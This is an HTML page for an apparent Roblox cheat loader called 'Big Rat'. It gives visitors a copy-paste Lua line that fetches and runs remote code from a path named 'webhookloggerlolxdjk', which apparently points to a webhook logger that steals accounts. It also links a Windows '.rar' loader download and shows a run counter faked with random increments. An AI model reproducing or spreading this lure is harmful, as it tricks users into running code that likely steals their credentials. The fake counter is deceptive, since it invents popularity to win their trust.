<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Big Rat | Loader</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Inter', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            overflow-x: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        /* --- Animations --- */
        .intro-rat {
            opacity: 0;
            transform: translateY(30px) scale(0.9);
            animation: reveal 1s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .intro-card {
            opacity: 0;
            transform: translateY(20px);
            animation: reveal 1s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards;
        }

        @keyframes reveal {
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .rat-float { animation: float 6s ease-in-out infinite; }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        /* --- UI Styling --- */
        .main-card {
            background-color: #000;
            border: 1px solid #111;
            border-radius: 32px;
            box-shadow: 0 0 60px rgba(0,0,0,0.9);
        }

        .tab-btn { opacity: 0.4; transition: 0.3s; border-bottom: 2px solid transparent; }
        .tab-btn.active { opacity: 1; border-color: #fff; }

        .code-box {
            background: #050505;
            border: 1px solid #151515;
            color: #555;
            font-family: 'ui-monospace', monospace;
        }

        .status-badge {
            background: #080808;
            border: 1px solid #111;
        }

        #toast {
            position: fixed;
            bottom: -60px;
            left: 50%;
            transform: translateX(-50%);
            background: #fff;
            color: #000;
            padding: 12px 30px;
            border-radius: 99px;
            font-size: 11px;
            font-weight: 900;
            transition: bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 100;
        }
        #toast.visible { bottom: 40px; }
    </style>
</head>
<body class="p-4">

    <div class="flex flex-col items-center w-full max-w-lg">
        
        <div class="intro-rat mb-8">
            <div class="rat-float">
                <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="w-36 h-auto drop-shadow-[0_0_40px_rgba(255,255,255,0.05)]" alt="RAT">
            </div>
        </div>

        <div class="intro-card main-card w-full overflow-hidden">
            
            <div class="flex border-b border-[#111] bg-[#020202]">
                <button onclick="switchTab('script')" id="btn-script" class="tab-btn active flex-1 py-4 text-[10px] font-black uppercase tracking-[0.2em]">Script</button>
                <button onclick="switchTab('loader')" id="btn-loader" class="tab-btn flex-1 py-4 text-[10px] font-black uppercase tracking-[0.2em]">Loader</button>
                <button onclick="switchTab('offsets')" id="btn-offsets" class="tab-btn flex-1 py-4 text-[10px] font-black uppercase tracking-[0.2em]">Offsets</button>
            </div>

            <div class="p-10 text-center min-h-[400px] flex flex-col justify-center">
                
                <h1 class="text-5xl font-black tracking-tighter mb-1">big rat</h1>
                <p class="text-gray-600 text-[10px] font-bold uppercase tracking-[0.4em] mb-10">System Loader v7.4</p>

                <div id="tab-script" class="tab-content block">
                    <div class="bg-[#050505] border border-[#111] rounded-2xl p-6 mb-6">
                        <p class="text-[9px] uppercase tracking-[0.3em] text-gray-500 font-black mb-2">Authenticated Runs</p>
                        <p id="exec-count" class="text-4xl font-mono font-bold text-white tracking-tighter">100</p>
                    </div>

                    <div class="code-box text-left p-4 rounded-xl text-[10px] break-all mb-6 cursor-pointer hover:border-white/20 transition" onclick="copyToClipboard(this.innerText)">
                        <span id="script-path">loadstring(game:HttpGet("..."))()</span>
                    </div>

                    <button class="w-full py-4 bg-white hover:bg-gray-100 text-black font-black rounded-xl transition-all active:scale-[0.96] text-xs uppercase" onclick="copyToClipboard(document.getElementById('script-path').innerText)">
                        Copy Script
                    </button>
                </div>

                <div id="tab-loader" class="tab-content hidden">
                    <div class="status-badge rounded-2xl p-8 mb-6">
                        <p class="text-[9px] uppercase tracking-[0.3em] text-gray-500 font-black mb-2">Package: Win64 / .RAR</p>
                        <h2 class="text-3xl font-black text-white mb-3">cafeincc.rar</h2>
                        <div class="flex items-center justify-center gap-2">
                            <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                            <span id="roblox-version" class="text-[10px] font-mono text-gray-400 tracking-tighter uppercase">Checking Sync...</span>
                        </div>
                    </div>

                    <a href="https://gofile.io/d/o9JhqT" target="_blank" class="block w-full py-4 bg-white text-black font-black rounded-xl transition-all active:scale-[0.96] text-xs uppercase text-center">
                        Download Loader
                    </a>
                </div>

                <div id="tab-offsets" class="tab-content hidden text-left">
                    <div class="grid grid-cols-2 gap-2 mb-4">
                        <button onclick="fetchData('json')" class="py-3 bg-[#080808] border border-[#111] hover:border-white/40 text-[9px] font-black uppercase tracking-widest transition rounded-lg">JSON</button>
                        <button onclick="fetchData('hpp')" class="py-3 bg-[#080808] border border-[#111] hover:border-white/40 text-[9px] font-black uppercase tracking-widest transition rounded-lg">HPP</button>
                    </div>
                    <textarea id="offset-display" readonly class="w-full h-40 bg-[#050505] border border-[#111] rounded-xl p-4 text-[9px] font-mono text-gray-500 resize-none focus:outline-none" placeholder="// Fetch live offsets..."></textarea>
                </div>

            </div>

            <div class="p-6 bg-[#020202] border-t border-[#111] flex justify-between items-center">
                <a href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="text-gray-700 hover:text-white text-[10px] font-black transition-all tracking-widest uppercase">Discord</a>
                <div class="flex items-center gap-2">
                    <div class="w-1 h-1 bg-gray-800 rounded-full"></div>
                    <span class="text-gray-500 text-[9px] font-black uppercase tracking-widest">Active</span>
                </div>
            </div>
        </div>
    </div>

    <div id="toast">COPIED TO CLIPBOARD</div>

    <script>
        function switchTab(t) {
            document.querySelectorAll('.tab-content').forEach(c => {
                c.classList.add('hidden');
                c.classList.remove('block');
            });
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            
            const selected = document.getElementById(`tab-${t}`);
            selected.classList.remove('hidden');
            selected.classList.add('block');
            document.getElementById(`btn-${t}`).classList.add('active');
        }

        const PROXY = "https://api.allorigins.win/raw?url=";
        const TARGET = "https://offsets.ntgetwritewatch.workers.dev";

        async function fetchRobloxVersion() {
            const el = document.getElementById('roblox-version');
            try {
                const r = await fetch(PROXY + encodeURIComponent(`${TARGET}/version`));
                const text = await r.text();
                el.innerText = `Synced: ${text.trim()}`;
            } catch (e) {
                el.innerText = "Sync Offline";
            }
        }

        async function fetchData(ext) {
            const area = document.getElementById('offset-display');
            area.value = `// Fetching...`;
            try {
                const r = await fetch(PROXY + encodeURIComponent(`${TARGET}/offsets.${ext}`));
                const text = await r.text();
                area.value = text;
            } catch (e) {
                area.value = "// Error fetching offsets.";
            }
        }

        let baseCount = parseInt(localStorage.getItem('rat_execs')) || 100;
        const countEl = document.getElementById('exec-count');
        countEl.innerText = baseCount.toLocaleString();

        setInterval(() => {
            if (Math.random() > 0.7) {
                baseCount += Math.floor(Math.random() * 2) + 1;
                countEl.innerText = baseCount.toLocaleString();
                localStorage.setItem('rat_execs', baseCount);
            }
        }, 10000);

        document.getElementById('script-path').innerText = `loadstring(game:HttpGet("https://${window.location.host}/webhookloggerlolxdjk"))()`;

        function copyToClipboard(val) {
            navigator.clipboard.writeText(val);
            const toast = document.getElementById("toast");
            toast.classList.add("visible");
            setTimeout(() => toast.classList.remove("visible"), 2000);
        }

        fetchRobloxVersion();
    </script>
</body>
</html>
